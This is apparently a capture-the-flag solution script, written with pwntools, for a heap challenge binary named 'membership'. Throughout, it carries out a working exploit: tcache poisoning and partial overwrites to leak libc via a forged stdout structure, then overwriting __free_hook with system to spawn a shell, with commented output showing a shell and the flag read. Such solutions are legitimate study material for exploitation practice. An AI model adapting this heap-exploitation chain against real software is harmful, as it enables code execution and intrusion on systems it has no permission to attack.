#!/usr/bin/python

from pwn import *

PATH = './membership'

GDBSCRIPT = '''

'''

HOST = '172.17.0.2'
PORT = 4444

# HOST = 'bin.q21.ctfsecurinets.com'
# PORT = 1339

# [*] '/home/abdullahnz/ctf/securinet/pwn/member/membership'
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [!] Wrong bytes!
# [!] Wrong bytes!
# [!] Wrong bytes!
# [!] Wrong bytes!
# [*] Found correct bytes _IO_2_1_stdout, go ahead!
# [*] _IO_2_1_stdin_ 0x7f2cb822b980
# [*] libc.address 0x7f2cb8040000
# [*] Switching to interactive mode
# $ id
# uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
# $ ls -la
# total 48
# drwxr-xr-x 1 ctf  ctf   4096 Mar 20 18:30 .
# drwxr-xr-x 1 root root  4096 Mar 20 12:22 ..
# -rw------- 1 ctf  ctf     81 Mar 20 18:30 .bash_history
# -rw-r--r-- 1 ctf  ctf    220 Feb 25  2020 .bash_logout
# -rw-r--r-- 1 ctf  ctf   3771 Feb 25  2020 .bashrc
# -rw-r--r-- 1 ctf  ctf    807 Feb 25  2020 .profile
# -rwxrwxrwx 1 root root    69 Oct 16 14:13 flag
# -rwxrwxrwx 1 root root 14560 Oct 16 14:19 main
# $ cat flag
# flag{welcome_you_are_now_one_of_us_4d2d08c6994188b642a854194916fbbc}


def debug(gdbscript):
    if type(r) == process:
        gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/.gdbinit_pwndbg'"])

def subscribe():
    r.sendlineafter('>', '1')

def unsubscribe(idx):
    r.sendlineafter('>', '2')
    r.sendlineafter(': ', f'{idx}')

def modify(idx, data):
    r.sendlineafter('>', '3')
    r.sendlineafter(': ', f'{idx}')
    r.sendafter(': ', data)

def exploit(r):
    for _ in range(3):
        subscribe()

    unsubscribe(0)
    unsubscribe(2)

    modify(2, b'\xf8')

    subscribe() # 0
    subscribe() # 2

    for _ in range(9):
        subscribe()

    subscribe()

    modify(2, p64(0x421))
    unsubscribe(1)
    
    # idx: 0 - 1 - 14 - 15 - 16
    for _ in range(5):
        subscribe() 

    # stdout = int(input('stdout: '), 16)
    # modify(16, p16(stdout & 0xffff))
    
    modify(16, b'\xa0\xb6')

    unsubscribe(14)
    unsubscribe(15)
    unsubscribe(1)

    modify(1, b'\x80')
    
    for _ in range(3):
        subscribe()


    try:
        fake_struct = p64(0xfbad1800) + p64(0) + p64(0) + p64(0) + b'\x08'
        modify(15, fake_struct)

        leak = u64(r.recvline()[:8])    

        if (leak >> 40) != 0x7f:
            return 0
    
        context.log_level = 'info'
        libc.address = leak - libc.sym['_IO_2_1_stdin_']
    
        info('Found correct bytes _IO_2_1_stdout, go ahead!')
        info(f'_IO_2_1_stdin_ 0x{leak:x}')
        info(f'libc.address 0x{libc.address:x}')

        unsubscribe(11)
        unsubscribe(12)

        modify(12, p64(libc.sym['__free_hook']))

        subscribe()
        subscribe()

        modify(12, p64(libc.sym['system']))
        modify(13, '/bin/sh\0')

        unsubscribe(13)
        return 1
    except:
        warn('Wrong bytes!')
        return 0

if __name__ == '__main__':
    elf  = ELF(PATH)
    libc = ELF('./libc-2.31.so', 0)

    context.log_level = 'warn'

    while True:
        if args.REMOTE:
            r = remote(HOST, PORT)
        else:
            r = process(PATH, aslr=0)
        if not exploit(r):
            r.close()
        else:
            r.interactive()
            break
            